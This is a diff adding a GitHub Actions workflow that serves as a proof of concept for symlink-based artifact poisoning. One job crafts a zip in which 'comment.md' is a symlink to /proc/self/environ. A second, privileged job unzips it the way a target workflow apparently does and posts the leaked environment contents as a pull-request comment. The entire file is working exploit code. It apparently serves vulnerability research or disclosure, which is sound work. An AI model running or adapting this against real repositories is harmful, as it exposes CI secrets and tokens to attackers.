@@ -1,0 +1,75 @@
+name: POC Artifact symlink read
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+
+jobs:
+  plant:
+    name: unprivileged-uploader
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: install artifact client
+        working-directory: .github/actions/poc-plant-zip
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: build crafted zip (comment.md is a symlink)
+        run: |
+          python3 - <<'PY'
+          import zipfile
+          z = zipfile.ZipFile('/tmp/evil.zip', 'w')
+          i = zipfile.ZipInfo('comment.md')
+          i.create_system = 3
+          i.external_attr = (0o120777 << 16)
+          z.writestr(i, '/proc/self/environ')
+          z.writestr('benign.txt', 'hello')
+          z.close()
+          PY
+          python3 -c "import zipfile;print(zipfile.ZipFile('/tmp/evil.zip').infolist())"
+      - uses: ./.github/actions/poc-plant-zip
+        with:
+          name: poc-output
+          zippath: /tmp/evil.zip
+
+  consume:
+    name: privileged-consumer
+    needs: plant
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+    steps:
+      - name: download artifact like the target workflow
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
+        with:
+          script: |
+            var artifacts = await github.rest.actions.listWorkflowRunArtifacts({
+              owner: context.repo.owner, repo: context.repo.repo, run_id: context.runId,
+            });
+            var matchArtifact = artifacts.data.artifacts.filter((a) => a.name == "poc-output")[0];
+            var download = await github.rest.actions.downloadArtifact({
+              owner: context.repo.owner, repo: context.repo.repo,
+              artifact_id: matchArtifact.id, archive_format: 'zip',
+            });
+            var fs = require('fs');
+            fs.writeFileSync('${{ github.workspace }}/comment.zip', Buffer.from(download.data));
+      - name: unzip exactly like the target
+        run: unzip comment.zip
+      - name: inspect extraction
+        run: |
+          ls -la
+          echo "readlink: $(readlink ./comment.md)"
+          echo "--- cat comment.md (cat process env) ---"
+          cat ./comment.md | tr '\0' '\n' | head -5
+      - name: post comment exactly like the target
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            var fs = require('fs');
+            var markdown = fs.readFileSync('./comment.md', 'utf8');
+            console.log('body length: ' + markdown.length);
+            await github.rest.issues.createComment({
+              owner: context.repo.owner, repo: context.repo.repo,
+              issue_number: 147, body: markdown
+            });
